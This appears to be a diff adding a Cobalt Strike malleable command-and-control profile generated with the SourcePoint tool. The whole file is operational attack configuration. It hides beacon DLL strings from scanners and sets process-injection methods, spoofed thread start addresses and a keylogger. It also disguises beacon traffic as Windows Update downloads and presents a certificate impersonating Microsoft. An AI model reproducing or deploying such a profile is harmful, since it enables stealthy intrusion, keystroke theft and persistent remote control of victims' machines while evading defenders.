@@ -1,0 +1,418 @@
+#Generate with https://github.com/Tylous/SourcePoint
+
+set host_stage "false";
+set sleeptime "5000";
+set jitter    "40";
+set useragent "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:86.0) Gecko/20100101 Firefox/86.0";
+
+http-beacon {
+    set library "wininet";
+	
+}
+
+
+# Task and Proxy Max Size
+set tasks_max_size "1048576";
+set tasks_proxy_max_size "921600";
+set tasks_dns_proxy_max_size "71680";
+
+set data_jitter "10";
+set smb_frame_header "";
+set pipename "srvsvc-1-5-5-0_##7426";
+set pipename_stager "srvsvc-1-5-5-0_##3475";
+
+set tcp_frame_header "";
+set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
+set ssh_pipename "srvsvc-1-5-5-0_####";
+
+####Manaully add these if your doing C2 over DNS (Future Release)####
+##dns-beacon {
+#    set dns_idle             "1.2.3.4";
+#    set dns_max_txt          "199";
+#    set dns_sleep            "1";
+#    set dns_ttl              "5";
+#    set maxdns               "200";
+#    set dns_stager_prepend   "doc-stg-prepend";
+#    set dns_stager_subhost   "doc-stg-sh.";
+
+#    set beacon               "doc.bc.";
+#    set get_A                "doc.1a.";
+#    set get_AAAA             "doc.4a.";
+#    set get_TXT              "doc.tx.";
+#    set put_metadata         "doc.md.";
+#    set put_output           "doc.po.";
+#    set ns_response          "zero";
+
+#}
+
+
+
+stage {
+	set obfuscate "true";
+	set stomppe "true";
+	set cleanup "true";
+	set userwx "false";
+	set smartinject "false";
+
+
+
+	set syscall_method "Indirect"; #### needs a varible
+	set sleep_mask "false";
+	
+	 
+set checksum       "2434978";
+set compile_time   "12 Dec 2022 11:46:37";
+set entry_point    "1310336";
+set image_size_x86 "2519040";
+set image_size_x64 "2519040";
+set name           "InProcessClient.dll";
+set rich_header    "\x50\x58\xa2\x76\x14\x39\xcc\x25\x14\x39\xcc\x25\x14\x39\xcc\x25\x5f\x41\xcf\x24\x01\x39\xcc\x25\x5f\x41\xc9\x24\xaa\x39\xcc\x25\x74\x43\x31\x25\x15\x39\xcc\x25\x74\x43\xc8\x24\x05\x39\xcc\x25\x74\x43\xcf\x24\x1a\x39\xcc\x25\x76\x41\xc9\x24\x16\x39\xcc\x25\x70\x43\xcd\x24\x16\x39\xcc\x25\x74\x43\xc9\x24\xb5\x39\xcc\x25\x70\x43\xc9\x24\x17\x39\xcc\x25\x7e\x51\xc9\x24\x05\x39\xcc\x25\x5f\x41\xcd\x24\x1d\x39\xcc\x25\x5f\x41\xca\x24\x15\x39\xcc\x25\x5f\x41\xc8\x24\x37\x39\xcc\x25\x14\x39\xcd\x25\xf7\x38\xcc\x25\x70\x43\xc5\x24\xb6\x39\xcc\x25\x70\x43\xcf\x24\x16\x39\xcc\x25\x70\x43\xcc\x24\x15\x39\xcc\x25\x70\x43\x33\x25\x15\x39\xcc\x25\x70\x43\xce\x24\x15\x39\xcc\x25\x52\x69\x63\x68\x14\x39\xcc\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+
+	
+	
+	transform-x86 {
+		prepend "\x90\x90\x90"; # NOP, NOP!
+		strrep "ReflectiveLoader" "";
+		strrep "This program cannot be run in DOS mode" "";
+		strrep "NtQueueApcThread" "";
+		strrep "Stack memory was corrupted" "";
+		strrep "beacon.dll" "";
+		strrep "ADVAPI32.dll" "";
+		strrep "WININET.dll" "";
+		strrep "WS2_32.dll" "";
+		strrep "DNSAPI.dll" "";
+		strrep "Secur32.dll" "";
+		strrep "VirtualProtectEx" "";
+		strrep "VirtualProtect" "";
+		strrep "VirtualAllocEx" "";
+		strrep "VirtualAlloc" "";
+		strrep "VirtualFree" "";
+		strrep "VirtualQuery" "";
+		strrep "RtlVirtualUnwind" "";
+		strrep "sAlloc" "";
+		strrep "FlsFree" "";
+		strrep "FlsGetValue" "";
+		strrep "FlsSetValue" "";
+		strrep "InitializeCriticalSectionEx" "";
+		strrep "CreateSemaphoreExW" "";
+		strrep "SetThreadStackGuarantee" "";
+		strrep "CreateThreadpoolTimer" "";
+		strrep "SetThreadpoolTimer" "";
+		strrep "WaitForThreadpoolTimerCallbacks" "";
+		strrep "CloseThreadpoolTimer" "";
+		strrep "CreateThreadpoolWait" "";
+		strrep "SetThreadpoolWait" "";
+		strrep "CloseThreadpoolWait" "";
+		strrep "FlushProcessWriteBuffers" "";
+		strrep "FreeLibraryWhenCallbackReturns" "";
+		strrep "GetCurrentProcessorNumber" "";
+		strrep "GetLogicalProcessorInformation" "";
+		strrep "CreateSymbolicLinkW" "";
+		strrep "SetDefaultDllDirectories" "";
+		strrep "EnumSystemLocalesEx" "";
+		strrep "CompareStringEx" "";
+		strrep "GetDateFormatEx" "";
+		strrep "GetLocaleInfoEx" "";
+		strrep "GetTimeFormatEx" "";
+		strrep "GetUserDefaultLocaleName" "";
+		strrep "IsValidLocaleName" "";
+		strrep "LCMapStringEx" "";
+		strrep "GetCurrentPackageId" "";
+		strrep "UNICODE" "";
+		strrep "UTF-8" "";
+		strrep "UTF-16LE" "";
+		strrep "MessageBoxW" "";
+		strrep "GetActiveWindow" "";
+		strrep "GetLastActivePopup" "";
+		strrep "GetUserObjectInformationW" "";
+		strrep "GetProcessWindowStation" "";
+		strrep "Sunday" "";
+		strrep "Monday" "";
+		strrep "Tuesday" "";
+		strrep "Wednesday" "";
+		strrep "Thursday" "";
+		strrep "Friday" "";
+		strrep "Saturday" "";
+		strrep "January" "";
+		strrep "February" "";
+		strrep "March" "";
+		strrep "April" "";
+		strrep "June" "";
+		strrep "July" "";
+		strrep "August" "";
+		strrep "September" "";
+		strrep "October" "";
+		strrep "November" "";
+		strrep "December" "";
+		strrep "MM/dd/yy" "";
+		strrep "Stack memory around _alloca was corrupted" "";
+		strrep "Unknown Runtime Check Error" "";
+		strrep "Unknown Filename" "";
+		strrep "Unknown Module Name" "";
+		strrep "Run-Time Check Failure #%d - %s" "";
+		strrep "Stack corrupted near unknown variable" "";
+		strrep "Stack pointer corruption" "";
+		strrep "Cast to smaller type causing loss of data" "";
+		strrep "Stack memory corruption" "";
+		strrep "Local variable used before initialization" "";
+		strrep "Stack around _alloca corrupted" "";
+		strrep "RegOpenKeyExW" "";
+		strrep "egQueryValueExW" "";
+		strrep "RegCloseKey" "";
+		strrep "LibTomMath" "";
+		strrep "Wow64DisableWow64FsRedirection" "";
+		strrep "Wow64RevertWow64FsRedirection" "";
+		strrep "Kerberos" "";
+		strrep "msvcrt.dll" "";
+		strrep "C:\\Windows\\System32\\msvcrt.dll" "";
+		strrep "Stack around the variable" "";
+		strrep "' was corrupted." "" ;
+		strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared with a different calling convention." "";
+
+		}
+
+	transform-x64 {
+		prepend "\x90\x90\x90"; # NOP, NOP!
+		strrep "ReflectiveLoader" "";
+		strrep "This program cannot be run in DOS mode" "";
+		strrep "beacon.x64.dll" "";
+		strrep "NtQueueApcThread" "";
+		strrep "Stack memory was corrupted" "";
+		strrep "beacon.dll" "";
+		strrep "ADVAPI32.dll" "";
+		strrep "WININET.dll" "";
+		strrep "WS2_32.dll" "";
+		strrep "DNSAPI.dll" "";
+		strrep "Secur32.dll" "";
+		strrep "VirtualProtectEx" "";
+		strrep "VirtualProtect" "";
+		strrep "VirtualAllocEx" "";
+		strrep "VirtualAlloc" "";
+		strrep "VirtualFree" "";
+		strrep "VirtualQuery" "";
+		strrep "RtlVirtualUnwind" "";
+		strrep "sAlloc" "";
+		strrep "FlsFree" "";
+		strrep "FlsGetValue" "";
+		strrep "FlsSetValue" "";
+		strrep "InitializeCriticalSectionEx" "";
+		strrep "CreateSemaphoreExW" "";
+		strrep "SetThreadStackGuarantee" "";
+		strrep "CreateThreadpoolTimer" "";
+		strrep "SetThreadpoolTimer" "";
+		strrep "WaitForThreadpoolTimerCallbacks" "";
+		strrep "CloseThreadpoolTimer" "";
+		strrep "CreateThreadpoolWait" "";
+		strrep "SetThreadpoolWait" "";
+		strrep "FreeLibraryWhenCallbackReturns" "";
+		strrep "GetCurrentProcessorNumber" "";
+		strrep "GetLogicalProcessorInformation" "";
+		strrep "CreateSymbolicLinkW" "";
+		strrep "SetDefaultDllDirectories" "";
+		strrep "EnumSystemLocalesEx" "";
+		strrep "CompareStringEx" "";
+		strrep "GetDateFormatEx" "";
+		strrep "GetLocaleInfoEx" "";
+		strrep "GetTimeFormatEx" "";
+		strrep "GetUserDefaultLocaleName" "";
+		strrep "IsValidLocaleName" "";
+		strrep "LCMapStringEx" "";
+		strrep "GetCurrentPackageId" "";
+		strrep "UNICODE" "";
+		strrep "UTF-8" "";
+		strrep "UTF-16LE" "";
+		strrep "MessageBoxW" "";
+		strrep "GetActiveWindow" "";
+		strrep "GetLastActivePopup" "";
+		strrep "GetUserObjectInformationW" "";
+		strrep "GetProcessWindowStation" "";
+		strrep "Sunday" "";
+		strrep "Monday" "";
+		strrep "Tuesday" "";
+		strrep "Wednesday" "";
+		strrep "Thursday" "";
+		strrep "Friday" "";
+		strrep "Saturday" "";
+		strrep "January" "";
+		strrep "February" "";
+		strrep "March" "";
+		strrep "April" "";
+		strrep "June" "";
+		strrep "July" "";
+		strrep "August" "";
+		strrep "September" "";
+		strrep "October" "";
+		strrep "November" "";
+		strrep "December" "";
+		strrep "MM/dd/yy" "";
+		strrep "Stack memory around _alloca was corrupted" "";
+		strrep "Unknown Runtime Check Error" "";
+		strrep "Unknown Filename" "";
+		strrep "Unknown Module Name" "";
+		strrep "Run-Time Check Failure #%d - %s" "";
+		strrep "Stack corrupted near unknown variable" "";
+		strrep "Stack pointer corruption" "";
+		strrep "Cast to smaller type causing loss of data" "";
+		strrep "Stack memory corruption" "";
+		strrep "Local variable used before initialization" "";
+		strrep "Stack around _alloca corrupted" "";
+		strrep "RegOpenKeyExW" "";
+		strrep "egQueryValueExW" "";
+		strrep "RegCloseKey" "";
+		strrep "LibTomMath" "";
+		strrep "Wow64DisableWow64FsRedirection" "";
+		strrep "Wow64RevertWow64FsRedirection" "";
+		strrep "Kerberos" "";
+		strrep "msvcrt.dll" "";
+		strrep "C:\\Windows\\System32\\msvcrt.dll" "";
+		strrep "Stack around the variable" "";
+		strrep "' was corrupted." "" ;
+		strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared with a different calling convention." "";
+
+		}
+}
+
+
+process-inject {
+    # set remote memory allocation technique
+	set allocator "VirtualAllocEx";
+
+    # shape the content and properties of what we will inject
+    set min_alloc "8096";
+    set userwx    "false";
+    set startrwx "true";
+	
+ 
+
+    # specify how we execute code in the remote process
+    execute {
+		CreateThread "ntdll.dll!RtlUserThreadStart+0x2379";
+        NtQueueApcThread-s;
+        SetThreadContext;
+        CreateRemoteThread;
+		CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
+        RtlCreateUserThread;
+	}
+}
+
+post-ex {
+    # control the temporary process we spawn to
+	
+	set spawnto_x86 "%windir%\\syswow64\\powercfg.exe";
+	set spawnto_x64 "%windir%\\sysnative\\powercfg.exe";
+
+
+    # change the permissions and content of our post-ex DLLs
+    set obfuscate "true";
+
+	# Allows multi-threaded post-ex DLLs to spawn threads with a spoofed start address
+	set thread_hint "combase.dll!InternalTlsAllocData+0x561";
+
+    # pass key function pointers from Beacon to its child jobs
+    set smartinject "false";
+ 
+    # disable AMSI in powerpick, execute-assembly, and psinject
+    set amsi_disable "false";
+	# do not enable this unless needed. Disabling AMSI is an IOC
+	
+	# control the method used to log keystrokes 
+	set keylogger "SetWindowsHookEx";
+
+	# cleanup the post-ex UDRL memory when the post-ex DLL is loaded 
+	set cleanup "true";
+}
+
+	
+http-config {
+
+	#set "true" if teamserver is behind redirector
+	set trust_x_forwarded_for "false";			
+}
+
+http-get {
+set uri "/c/msdownload/update/others/2021/10/DeoIVVpaK8eEaat2cwxQHhsuW3 ";
+
+
+
+client {
+
+	header "Accept" "*/*";
+	header "Host" "192.168.146.149";
+	
+	metadata {
+		base64url;
+		append ".cab";
+		uri-append;
+	}
+}
+
+
+server {
+	header "Content-Type" "application/vnd.ms-cab-compressed";
+	header "Server" "Microsoft-IIS/8.5";
+	header "MSRegion" "N. America";
+	header "Connection" "keep-alive";
+	header "X-Powered-By" "ASP.NET";
+
+	output {
+
+		print;
+	}
+}
+}
+
+http-post {
+set uri "/c/msdownload/update/others/2021/10/PBsQw1f6gA4wNLGpEyvf ";
+
+
+set verb "GET";
+
+client {
+
+	header "Accept" "*/*";
+
+
+	id {
+		prepend "download.windowsupdate.com/c/";
+		header "Host";
+	}
+
+
+	output {
+		base64url;
+		append ".cab";
+		uri-append;
+	}
+}
+
+server {
+	header "Content-Type" "application/vnd.ms-cab-compressed";
+	header "Server" "Microsoft-IIS/8.5";
+	header "MSRegion" "N. America";
+	header "Connection" "keep-alive";
+	header "X-Powered-By" "ASP.NET";
+
+	output {
+		print;
+	}
+}
+}
+
+http-stager {
+	server {
+		header "Content-Type" "application/vnd.ms-cab-compressed";
+	}
+}
+
+	
+https-certificate {
+set CN       "192.168.146.149"; #Common Name
+set O        "Microsoft Corporation"; #Organization Name
+set C        "US"; #Country
+set L        "Redmond"; #Locality
+set OU       "Microsoft IT"; #Organizational Unit Name
+set ST       "WA"; #State or Province
+set validity "365"; #Number of days the cert is valid for
+}
+
+	
